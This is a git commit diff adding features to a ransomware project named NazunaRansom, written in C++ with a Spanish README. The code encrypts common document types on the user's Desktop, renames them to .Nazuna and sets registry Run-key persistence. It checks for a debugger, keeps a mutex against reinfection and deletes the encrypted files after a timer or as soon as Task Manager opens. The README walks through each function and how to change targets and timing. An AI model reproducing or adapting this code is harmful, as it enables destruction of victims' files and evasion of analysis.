6dce953f8563418bae2c5fe321fcdd84e2c4c9c7
ic4rta <oxmars12@gmail.com>
2023-07-15 12:29:38 -0600

    nuevas funciones

--- NazunaRansom.cpp
+++ NazunaRansom.cpp
@@ -1,3 +1,7 @@
+#include <iostream>
+#include <fstream>
+#include <chrono>
+#include <thread>
 #include <windows.h>
 #include <wincrypt.h>
 #include <stdio.h>
@@ -14,23 +18,23 @@ using namespace std;
 #define BUF_LEN 1024
 #define KEY_TAM 16
 #define USER_TAM 256
+#define MUTEX "TeAmoNazuna"
+BOOL IsDebug = FALSE;
 
-struct Nazuna {
+bool cifrar_archivos(const string& ruta_archivo);
+void recorrer_dir(const string& ruta_recorrer);
+void eliminar_archivos_cifrados(const string& ruta_recorrer);
+DWORD WINAPI eliminar_archivos_routine(LPVOID lpParam);
+void persistencia();
+
+bool cifrar_archivos(const string& ruta_archivo) {
+    HCRYPTPROV hProv;
+    HCRYPTKEY hkey;
+    BYTE buf[BUF_LEN];
     static constexpr BYTE KEY[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
     static constexpr BYTE IV[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
 
-    HCRYPTPROV hProv;
-    HCRYPTKEY hkey;
-};
-
-bool cifrar_archivos(const string& filePath);
-void recorrer_dir(const string& ruta_recorrer);
-
-bool cifrar_archivos(const string& filePath) {
-    BYTE buf[BUF_LEN];
-    Nazuna nazuna;
-
-    ifstream archivo_original(filePath, ios::binary);
+    ifstream archivo_original(ruta_archivo, ios::binary);
     if (!archivo_original.is_open()) {
         return false;
     }
@@ -41,34 +45,33 @@ bool cifrar_archivos(const string& filePath) {
 
     DWORD mode = CRYPT_MODE_CBC;
 
-    if (!CryptAcquireContext(&nazuna.hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
-        if (!CryptAcquireContext(&nazuna.hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
+    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
+        if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
             return false;
         }
     }
 
-    CryptGenKey(nazuna.hProv, CALG_AES_128, CRYPT_EXPORTABLE, &nazuna.hkey);
-    CryptSetKeyParam(nazuna.hkey, KP_IV, Nazuna::IV, 0);
-    CryptSetKeyParam(nazuna.hkey, KP_MODE, reinterpret_cast<const BYTE*>(&mode), 0);
-    CryptEncrypt(nazuna.hkey, 0, true, 0, buf, &bytes_leer, BUF_LEN);
+    CryptGenKey(hProv, CALG_AES_128, CRYPT_EXPORTABLE, &hkey);
+    CryptSetKeyParam(hkey, KP_IV, IV, 0);
+    CryptSetKeyParam(hkey, KP_MODE, reinterpret_cast<const BYTE*>(&mode), 0);
+    CryptEncrypt(hkey, 0, true, 0, buf, &bytes_leer, BUF_LEN);
 
-    ofstream archivo_cifrado(filePath, ios::binary);
+    ofstream archivo_cifrado(ruta_archivo, ios::binary);
 
     if (!archivo_cifrado.is_open()) {
-        CryptDestroyKey(nazuna.hkey);
-        CryptReleaseContext(nazuna.hProv, 0);
+        CryptDestroyKey(hkey);
+        CryptReleaseContext(hProv, 0);
         return false;
     }
 
     archivo_cifrado.write(reinterpret_cast<char*>(buf), bytes_leer);
     archivo_cifrado.close();
 
-    CryptDestroyKey(nazuna.hkey);
-    CryptReleaseContext(nazuna.hProv, 0);
+    CryptDestroyKey(hkey);
+    CryptReleaseContext(hProv, 0);
 
     return true;
 }
-
 
 void recorrer_dir(const string& ruta_recorrer) {
     vector<string> subdirectorios;
@@ -84,14 +87,15 @@ void recorrer_dir(const string& ruta_recorrer) {
                     string subruta_recorrer = ruta_recorrer + "\\" + ruta_data.cFileName;
                     subdirectorios.push_back(subruta_recorrer);
                 }
-            } else {
-                const string filePath = ruta_recorrer + "\\" + ruta_data.cFileName;
-                const string extension = filesystem::path(filePath).extension().string();
+            }
+            else {
+                const string ruta_archivo = ruta_recorrer + "\\" + ruta_data.cFileName;
+                const string extension = filesystem::path(ruta_archivo).extension().string();
 
                 if (extension == ".txt" || extension == ".cpp" || extension == ".pdf" || extension == ".docx" || extension == ".xlsx") {
-                    if (cifrar_archivos(filePath)) {
-                        const string newFileName = filesystem::path(filePath).replace_extension(".Nazuna").string();
-                        filesystem::rename(filePath, newFileName);
+                    if (cifrar_archivos(ruta_archivo)) {
+                        const string newFileName = filesystem::path(ruta_archivo).replace_extension(".Nazuna").string();
+                        filesystem::rename(ruta_archivo, newFileName);
                     }
                 }
             }
@@ -105,31 +109,117 @@ void recorrer_dir(const string& ruta_recorrer) {
     }
 }
 
+void eliminar_archivos_cifrados(const string& ruta_recorrer) {
+    WIN32_FIND_DATA ruta_data;
+    HANDLE hFind = FindFirstFile((ruta_recorrer + "\\*").c_str(), &ruta_data);
+
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (ruta_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                if (strcmp(ruta_data.cFileName, ".") != 0 && strcmp(ruta_data.cFileName, "..") != 0) {
+                    eliminar_archivos_cifrados(ruta_recorrer + "\\" + ruta_data.cFileName);
+                }
+            }
+            else {
+                const string ruta_archivo = ruta_recorrer + "\\" + ruta_data.cFileName;
+                const string extension = filesystem::path(ruta_archivo).extension().string();
+
+                if (extension == ".Nazuna") {
+                    if (remove(ruta_archivo.c_str()) == 0) {
+
+                    }
+                }
+            }
+        } while (FindNextFile(hFind, &ruta_data));
+        FindClose(hFind);
+    }
+}
+
+void persistencia() {
+    HKEY hKey;
+    LPCSTR lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    LPCSTR lpValueName = "NazunaRansom";
+    char lpValue[MAX_PATH];
+
+    string ruta_descarga = filesystem::path(string(getenv("USERPROFILE")) + "\\Downloads").string();
+    string ruta_ransom = ruta_descarga + "\\NazunaRansom.exe";
+
+    strncpy_s(lpValue, MAX_PATH, ruta_ransom.c_str(), MAX_PATH);
+
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+        if (RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (BYTE*)lpValue, strlen(lpValue) + 1) == ERROR_SUCCESS) {
+            cout << "Si funciona" << endl;
+        }
+        RegCloseKey(hKey);
+    }
+}
+
 void cambiar_fondo() {
     char username[USER_TAM];
     DWORD username_tam = USER_TAM;
-    
+
     GetUserNameA(username, &username_tam);
     const char* url = "https://raw.githubusercontent.com/ic4rta/NazunaRansom/main/Nazuna_Ransom_Fondo.jpg";
 
     string destino_guardar = "C:\\Users\\";
     destino_guardar += username;
     destino_guardar += "\\Downloads\\Nazuna_Ransom_Fondo.jpg";
-    
+
     LPCSTR lpcstr_destino = destino_guardar.c_str();
-    
+
     URLDownloadToFile(NULL, url, lpcstr_destino, 0, NULL);
     SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)lpcstr_destino, SPIF_UPDATEINIFILE);
-    ExitWindowsEx(EWX_LOGOFF, 0);
+}
+
+DWORD WINAPI eliminar_archivos_routine(LPVOID lpParam) {
+    const string& ruta_recorrer = static_cast<const char*>(lpParam);
+    this_thread::sleep_for(chrono::minutes(1));
+    eliminar_archivos_cifrados(ruta_recorrer);
+    return 0;
 }
 
 int main() {
-    HWND ventana_cmd = GetConsoleWindow();
-	ShowWindow(ventana_cmd, SW_HIDE);
+    HANDLE mutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, MUTEX);
+    if (mutex != NULL) {
+        CloseHandle(mutex);
+        exit(-1);
+    }else{
+        mutex = CreateMutex(NULL, TRUE, MUTEX);
+        if (mutex == NULL){
+            DWORD error = GetLastError();
+            if (error == ERROR_ALREADY_EXISTS){
+                exit(-1);
+            }
+        }else{
+            if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &IsDebug)){
+                if (IsDebug){
+                    exit(-1);
+                }else{
+                    HWND ventana_cmd = GetConsoleWindow();
+                    ShowWindow(ventana_cmd, SW_HIDE);
 
-    string ruta = filesystem::path(string(getenv("USERPROFILE")) + "\\Desktop").string();
-    recorrer_dir(ruta);
-    cambiar_fondo();
+                    persistencia();
 
+                    string ruta = filesystem::path(string(getenv("USERPROFILE")) + "\\Desktop").string();
+                    recorrer_dir(ruta);
+                    cambiar_fondo();
+
+                    HANDLE hThread = CreateThread(NULL, 0, eliminar_archivos_routine, (LPVOID)ruta.c_str(), 0, NULL);
+                    if (hThread != NULL) {
+                        while (true) {
+                            HWND taskManagerWnd = FindWindowA("TaskManagerWindow", nullptr);
+                            if (taskManagerWnd != nullptr) {
+                                eliminar_archivos_cifrados(ruta);
+                                break;
+                            }
+                            this_thread::sleep_for(chrono::seconds(1));
+                        }
+                        CloseHandle(hThread);
+                    }
+                    while (true) { }
+                }
+            }
+        }
+    }
     return 0;
 }
--- README.md
+++ README.md
@@ -4,9 +4,14 @@ Nazuna Ransomware v1, es un ransomware inspirado en mi waifu (Nazuna)
 ### Caracteristicas
 
 - Usa cifrado AES-128 en modo CBC
-- Cierra la sesion del usuario
-- Cambia el fondo de pantalla
-- Cifra los subdirectorios de un directorio dado
+- Cambia el fondo de pantalla (descarga la imagen de internet)
+- Cifra los archivos de un directorio y sus subdirectorios
+- Implementa una persistencia basica basada en el registro para ejectuar el ransomware cuando se vuelva a prender la computadora
+- Crea un hilo el cual tiene un temporizador de 5 minutos antes de que llame a una funcion para que se eliminen los archivos cifrados (el temporizador se reinicia al cerrar sesion o apagar la computadora)
+- Si se abre el administrador de tareas los archivos se eliminan inmediatamente
+- Se implementa CheckRemoteDebuggerPresent como tecnica anti depuracion
+- Se implementa una exclusion mutua (mutex) para que si la computadora ya fue infectada, no vuelve a crear otro proceso
+- La key para cifrar los archivos esta intencionalmente creada para que sea la misma secuencia del 0 al 15
 
 ### Funciones de cifrado
 
@@ -35,6 +40,28 @@ CryptEncrypt(nazuna.hkey, 0, true, 0, buf, &bytes_leer, BUF_LEN);
 ```
 Cifra los datos de acuerdo al CSP, ```buf``` es un puntero al buffer datos que contiene los datos que se van a cifrar, ```bytes_leer``` es la cantidad de bytes que se van a cifrar, que son los bytes del archivo original, este buffer cifrado se sobreescribira por el original con unas funciones más adelante
 
+### Funcion recorrer_dir
+
+Las funciones ```FindFirstFile``` y ```FindNextFile``` se usan para recorrer el directorios y subdirectorios desde la ruta almacenada en ```ruta_encriptar```, el segundo if verifica si ```ruta_data``` es un directorio mediante el AND y ```FILE_ATTRIBUTE_DIRECTORY```, el tercer if usando ```strcmp``` se compara ```ruta_data.cFileName``` con ```.``` y ```..``` para ver si ```ruta_data``` se refiere al directorio actual(.) o al directorio padre(..), si es diferente de 0 y se cumple la condicion anterior, se crea una variable llamada ```subruta_recorrer``` la cual representa la ruta del subdirectorio que se va a recorrer y la agrega a ```subdirectorios```.
+
+El penultimo if representa las extensiones y hace un ```OR``` entre todas las extensiones, si encuentra una extension entrara al ultimo if el cual verifica si ```cifrar_archivos``` regresa ```true```, y en caso de que si, cambia la extension del archivo a .Nazuna y lo renombra con esa extension
+
+### Funcion eliminar_archivos_cifrados
+
+Tiene un funcionamiento similar a recorrer_dir, solo que se verifica si la extension es igual a .Nazuna (```extension == ".Nazuna"```), y en caso de que si sea, se elimina el archivo
+
+### Funcion persistencia
+
+Es la que se encarga de que el ransomware de inicie al prender la compu e iniciar sesion, simplemente usa ```RegOpenKeyEx``` para abrir el registro en la ruta almacenada en ```lpSubKey``` y despues usa ```RegSetValueEx``` para establecer una entrada el registro, donde ```lpValue``` es la ruta del ejecutable, y ```lpValueName``` es el nombre del ejecutable.
+
+### Funcion eliminar_archivos_routine
+
+Es la funcion que se ejecutara al crear un hilo con ```CreateThread```, el parametro ```lpParam``` indica la ruta del directorio que se va a recorrer para eliminar los archivos, despues se agrega un pequeño temporizador de 5 minutos para "detener" la ejecucion del hilo 5 minutos antes de llamar a ```eliminar_archivos_cifrados```
+
+### Detectar al administrador de tareas
+
+Dentro del main cuando se hace uso de ```CreateThread```, si el identificador del hilo es diferente de NULL (hThread != NULL) entra en un bucle infinito donde mediante un if y la funcion ```FindWindowA``` esta constantemente buscando por la ventana con el nombre ```TaskManagerWindow``` y cuando la encuentre manda a llamar a ```eliminar_archivos_cifrados```
+
 ### Modificaciones
 
 Dentro de la funcion ```recorrer_dir``` puedes especificar las extensiones de los archivos que quieres que se cifren:
@@ -49,6 +76,30 @@ En la funcion ```main``` puedes especificar otro directorio que se va a cifrar
 string ruta = filesystem::path(string(getenv("USERPROFILE")) + "\\Desktop").string();
 ```
 Solo modifica ```Desktop``` por otra, ej: ```Documents```
+
+En la funcion routine ```eliminar_archivos_routine``` le puedes indicar el tiempo en minutos que deseas que espere antes de borrar los archivos
+
+```c++
+this_thread::sleep_for(chrono::minutes(1)); <-- El numero indica los minutos
+```
+
+Puedes cambiar el valor del mutex por otro que no este en uso
+
+```c++
+#define MUTEX "TeAmoNazuna" --> #define MUTEX "otroValor"
+```
+
+En la funcion ```persistencia``` se ejecuta el ransomware desde la ruta Downloads con el nombre ```NazunaRansom```, puedes cambiar la ruta indicandolo en:
+
+```c++
+string ruta_descarga = filesystem::path(string(getenv("USERPROFILE")) + "\\Downloads").string();
+```
+
+Y puedes cambiar el nombre del ejecutable en:
+
+```c++
+LPCSTR lpValueName = "NazunaRansom";
+```
 
 ### Compilado
 Yo lo compile desde GNU/Linux con el comando
